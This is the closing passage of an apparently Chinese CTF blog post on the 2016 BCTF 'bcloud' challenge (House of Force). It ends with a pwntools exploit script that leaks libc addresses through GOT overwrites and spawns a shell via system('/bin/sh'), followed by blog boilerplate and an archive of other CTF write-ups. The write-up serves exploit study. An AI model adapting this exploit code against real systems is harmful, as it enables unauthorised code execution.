class="string">&apos;cccc&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">#step4. leak atoi_addr</span></span><br><span class="line">	payload = p32(elf.got[<span class="string">&apos;free&apos;</span>])</span><br><span class="line">	payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">	payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">	newNote(<span class="number">0x100</span>,payload)</span><br><span class="line">	editNote(<span class="number">0</span>,p32(elf.symbols[<span class="string">&apos;printf&apos;</span>]))</span><br><span class="line">	deleteNote(<span class="number">1</span>)</span><br><span class="line">	atoi_addr = u32(p.recvuntil(<span class="string">&apos;Delete success.&apos;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">	log.success(<span class="string">&apos;atoi_addr: &apos;</span>+hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step5. calc system_addr</span></span><br><span class="line">	libc_base = atoi_addr - libc.symbols[<span class="string">&apos;atoi&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;libc_addr: &apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step6. get shell</span></span><br><span class="line">	editNote(<span class="number">2</span>,p32(system_addr))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;option---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;/bin/sh;&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="http://yoursite.com">Po1lux</a>
            <p>原文链接：<a href="http://yoursite.com/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/">http://yoursite.com/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/</a>
            <p>发表日期：<a href="http://yoursite.com/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/">March 20th 2019, 11:19:07 pm</a>
            <p>更新日期：<a href="http://yoursite.com/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/">March 24th 2019, 10:41:51 pm</a>
            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2019/03/24/2018-SUCTF-Heap-[off by one,unlink]/" title= "2018-SUCTF-Heap-[off by one,unlink]">
                    <div class="nextTitle">2018-SUCTF-Heap-[off by one,unlink]</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2019/03/10/libc源码分析-chunk的释放/" title= "libc源码分析-chunk的释放">
                    <div class="prevTitle">libc源码分析-chunk的释放</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- gitalk评论 -->

    <!-- utteranc评论 -->

    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:seanchen013@gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/Po1lux" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-House-of-Force"><span class="toc-number">1.</span> <span class="toc-text">0x00 House of Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2016-BCTF-bcloud"><span class="toc-number">2.</span> <span class="toc-text">2016-BCTF-bcloud</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-序及利用分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 序及利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-泄露堆指针"><span class="toc-number">3.1.</span> <span class="toc-text">1.泄露堆指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-修改topchunk的大小为0xffffffff"><span class="toc-number">3.2.</span> <span class="toc-text">2.修改topchunk的大小为0xffffffff</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-申请正确大小的内存，修改topchun的指针到0x804b118"><span class="toc-number">3.3.</span> <span class="toc-text">3.申请正确大小的内存，修改topchun的指针到0x804b118</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc会对申请的内存大小进行调整"><span class="toc-number">3.3.1.</span> <span class="toc-text">glibc会对申请的内存大小进行调整</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-泄露libc中函数的地址"><span class="toc-number">3.4.</span> <span class="toc-text">4.泄露libc中函数的地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-计算system的地址"><span class="toc-number">3.5.</span> <span class="toc-text">5.计算system的地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-总结"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-EXP"><span class="toc-number">5.</span> <span class="toc-text">0x04 EXP</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 57
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2020/06/04/Untitled/" >[Untitled Post]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2020/04/11/de5811cdab48a0f5e656384bd3feff88/" >de5811cdab48a0f5e656384bd3feff88</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2020/03/30/C-虚表杂记/" >C++虚表杂记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2020/03/26/51ff4f42e4a8218a6d27ec8cd9874f37/" >51ff4f42e4a8218a6d27ec8cd9874f37</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2020/03/25/android6-0-0源码分析-zygote启动过程/" >android-6.0.0源码分析-zygote启动过程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2020/02/23/mineucore-内核线程管理学习笔记/" >mineucore-内核线程管理学习笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2020/02/21/mineucore-x86-32下的中断处理/" >mineucore-x86-32下的中断处理</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2020/02/20/mineucore-x86-32系统启动流程/" >mineucore-x86-32系统启动流程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2020/02/19/inlineHookS/" >inlineHookS安卓内联hook框架</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/31</span><a class="archive-post-title" href= "/2020/01/31/内存壳学习/" >内存壳学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/04</span><a class="archive-post-title" href= "/2020/01/04/汇编分析一个so文件中的变形RC4和变形base64算法/" >汇编分析一个so文件中的变形RC4和变形base64算法</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2019/12/17/2019-12-17 ubuntu16-04源码编译Android6-0-0-r1/" >ubuntu-16.04 源码编译 Android-6.0.0_r1 与调试</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2019/12/17/2019-12-17 ubuntu16.04 处理wifi问题小记/" >ubuntu16.04 处理wifi问题小记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2019/12/15/FUPK源码阅读/" >FUPK源码阅读</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2019/12/14/2019-12-14 Android-6.0.0_r1源码分析-Java层加载Dex和类的过程/" >Android-6.0.0_r1源码分析-Java层加载Dex和类的过程</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/09</span><a class="archive-post-title" href= "/2019/12/09/NDK开发学习记录/" >NDK开发学习记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2019/12/02/2019-12-02 初试反调试/" >初试反调试</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2019/12/01/2019-12-01 手机和AS中debug环境配置问题小记/" >手机和AS中debug环境配置问题小记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2019/11/27/2019-11-27 nexus5环境配置/" >nexus5环境配置</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/2019/11/23/2019-12-23 通过在native层动态修改内存中的Dalvik指令来学习Dex文件格式/" >通过在native层动态修改内存中的Dalvik指令来学习Dex文件格式</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2019/11/20/2019-11-20 IDA-notebook/" >IDA notebook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2019/11/08/使用frida-Hook动态加载Dex/" >使用frida Hook动态加载Dex</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/frida使用/" >frida-notebook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2019/11/04/Linux-Kernel-ROP/" >Linux Kernel ROP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/06</span><a class="archive-post-title" href= "/2019/10/06/mineucore-虚拟内存管理学习笔记/" >mineucore-虚拟内存管理学习笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/03</span><a class="archive-post-title" href= "/2019/10/03/mineucore-物理内存管理学习笔记/" >mineucore-物理内存管理学习笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/" >seccomp沙箱机制 & 2019ByteCTF VIP</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/" >2019-SCTF-easy_heap[fastbin attack]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/25</span><a class="archive-post-title" href= "/2019/06/25/2019-SCTF-one_heap/" >2019-SCTF-one_heap[tcache的counts中存在的数据类型判断漏洞]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2019/06/10/2019-TCTF-final-babyheap2-29/" >2019-TCTF(final)-babyheap2.29</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2019/05/27/2018-0CTF-heapstorm2/" >2018-0CTF-heapstorm2</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2019/05/05/2019-sixstarsCTF-babyshell-shellcode/" >2019-sixstarsCTF-babyshell[shellcode]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/2019/05/04/2019-sixstarsCTF-heap_master/" >2019-sixstarsCTF-heap_master</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2019/05/03/2018-hitcon-baby-tcache/" >2018-hitcon-baby_tcache</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2019/05/03/2018-Hitcon-children-tcache/" >2018-Hitcon-children_tcache</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/02</span><a class="archive-post-title" href= "/2019/05/02/2019-sixstarsCTF-girlfriend/" >2019-sixstarsCTF-girlfriend[libc2.29,tcache]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2019/05/01/2019-sixstarsCTF-quicksort/" >2019-sixstarsCTF-quicksort</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2019/04/17/2018-网顶杯CTF-blind/" >2018-网顶杯CTF-blind</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2019/04/13/2019-西湖论剑CTF-Strom-note-off-by-one/" >2019-西湖论剑CTF-Strom_note-[off by one, largebin attack]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2019/04/10/2019-西湖论剑CTF-noinfoleak/" >2019-西湖论剑CTF-noinfoleak</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/2019-西湖论剑CTF-story/" >2019-西湖论剑CTF-story</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2019/04/04/2018-SUCTF-lock2-fmt-栈溢出-Canary/" >2018-SUCTF-lock2-[fmt,栈溢出,Canary]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2019/04/01/2018-SUCTF-note/" >2018-SUCTF-note</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/House-of-Orange在2-24glibc下的利用/" >House_of_Orange在2.24glibc下的利用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2019/03/27/2016-Hitcon-House-of-Orange/" >2016-Hitcon-House_of_Orange</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2019/03/24/2018-SUCTF-Heap-[off by one,unlink]/" >2018-SUCTF-Heap-[off by one,unlink]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2019/03/20/2016-BCTF-bcloud-[Heap of Force]/" >2016-BCTF-bcloud-[Heap of Force]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/libc源码分析-chunk的释放/" >libc源码分析-chunk的释放</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/08</span><a class="archive-post-title" href= "/2019/03/08/2014-hack.lu CTF-OREO-[House of spirit]/" >2014-hack.lu CTF-OREO-[House of spirit]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2019/03/02/2016-HCTF-fheap-[fastbin UAF,PIE,DynELF use fmt]/" >2016-HCTF-fheap-[fastbin UAF,PIE,DynELF use fmt]</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2018/10/20/2016-ZCTF-note2/" >2016 ZCTF note2</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/2014-HITCON-stkof/" >2014 HITCON stkof</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/2018/10/11/QiangwangCup-2015-shellman/" >QiangwangCup-2015-shellman</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2018/09/30/X-CTF-Quals-2016-b0verfl0w/" >X-CTF Quals 2016 - b0verfl0w</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2018/09/16/格式化字符串漏洞总结/" >格式化字符串漏洞总结</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2018/09/15/FengyunCup-2016-safedoor/" >FengyunCup-2016-safedoor</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2018/09/13/pwnable.kr-brain fuck/" >pwnable.kr-brain fuck</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="unlink"><span class="iconfont-archer">&#xe606;</span>unlink</span>
    
        <span class="sidebar-tag-name" data-tags="fastbin attack"><span class="iconfont-archer">&#xe606;</span>fastbin attack</span>
    
        <span class="sidebar-tag-name" data-tags="House of spirit"><span class="iconfont-archer">&#xe606;</span>House of spirit</span>
    
        <span class="sidebar-tag-name" data-tags="UAF"><span class="iconfont-archer">&#xe606;</span>UAF</span>
    
        <span class="sidebar-tag-name" data-tags="DynELF"><span class="iconfont-archer">&#xe606;</span>DynELF</span>
    
        <span class="sidebar-tag-name" data-tags="PIE"><span class="iconfont-archer">&#xe606;</span>PIE</span>
    
        <span class="sidebar-tag-name" data-tags="format string"><span class="iconfont-archer">&#xe606;</span>format string</span>
    
        <span class="sidebar-tag-name" data-tags="House of Force"><span class="iconfont-archer">&#xe606;</span>House of Force</span>
    
        <span class="sidebar-tag-name" data-tags="off by one"><span class="iconfont-archer">&#xe606;</span>off by one</span>
    
        <span class="sidebar-tag-name" data-tags="x64"><span class="iconfont-archer">&#xe606;</span>x64</span>
    
        <span class="sidebar-tag-name" data-tags="64bit"><span class="iconfont-archer">&#xe606;</span>64bit</span>
    
        <span class="sidebar-tag-name" data-tags="格式化字符串漏洞"><span class="iconfont-archer">&#xe606;</span>格式化字符串漏洞</span>
    
        <span class="sidebar-tag-name" data-tags="栈溢出"><span class="iconfont-archer">&#xe606;</span>栈溢出</span>
    
        <span class="sidebar-tag-name" data-tags="Canary"><span class="iconfont-archer">&#xe606;</span>Canary</span>
    
        <span class="sidebar-tag-name" data-tags="libc-2.29"><span class="iconfont-archer">&#xe606;</span>libc-2.29</span>
    
        <span class="sidebar-tag-name" data-tags="chunk overlapping"><span class="iconfont-archer">&#xe606;</span>chunk overlapping</span>
    
        <span class="sidebar-tag-name" data-tags="tcache"><span class="iconfont-archer">&#xe606;</span>tcache</span>
    
        <span class="sidebar-tag-name" data-tags="stack overflow"><span class="iconfont-archer">&#xe606;</span>stack overflow</span>
    
        <span class="sidebar-tag-name" data-tags="shellcode，系统调用"><span class="iconfont-archer">&#xe606;</span>shellcode，系统调用</span>
    
        <span class="sidebar-tag-name" data-tags="libc2.29"><span class="iconfont-archer">&#xe606;</span>libc2.29</span>
    
        <span class="sidebar-tag-name" data-tags="2016，CTFs，fsb"><span class="iconfont-archer">&#xe606;</span>2016，CTFs，fsb</span>
    
        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
    
        <span class="sidebar-tag-name" data-tags="stack pivoting"><span class="iconfont-archer">&#xe606;</span>stack pivoting</span>
    
        <span class="sidebar-tag-name" data-tags="pwnable"><span class="iconfont-archer">&#xe606;</span>pwnable</span>
    
        <span class="sidebar-tag-name" data-tags="OS"><span class="iconfont-archer">&#xe606;</span>OS</span>
    
        <span class="sidebar-tag-name" data-tags="fsb"><span class="iconfont-archer">&#xe606;</span>fsb</span>
    
        <span class="sidebar-tag-name" data-tags="fmt"><span class="iconfont-archer">&#xe606;</span>fmt</span>
    
        <span class="sidebar-tag-name" data-tags="rop"><span class="iconfont-archer">&#xe606;</span>rop</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="heap"><span class="iconfont-archer">&#xe60a;</span>heap</span>
    
        <span class="sidebar-category-name" data-categories="stack"><span class="iconfont-archer">&#xe60a;</span>stack</span>
    
        <span class="sidebar-category-name" data-categories="android-reverse"><span class="iconfont-archer">&#xe60a;</span>android-reverse</span>
    
        <span class="sidebar-category-name" data-categories="learning-note"><span class="iconfont-archer">&#xe60a;</span>learning-note</span>
    
        <span class="sidebar-category-name" data-categories="android-system"><span class="iconfont-archer">&#xe60a;</span>android-system</span>
    
        <span class="sidebar-category-name" data-categories="Operating-System"><span class="iconfont-archer">&#xe60a;</span>Operating-System</span>
    
        <span class="sidebar-category-name" data-categories="pwnable"><span class="iconfont-archer">&#xe60a;</span>pwnable</span>
    
        <span class="sidebar-category-name" data-categories="conclusion"><span class="iconfont-archer">&#xe60a;</span>conclusion</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "Po1lux"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


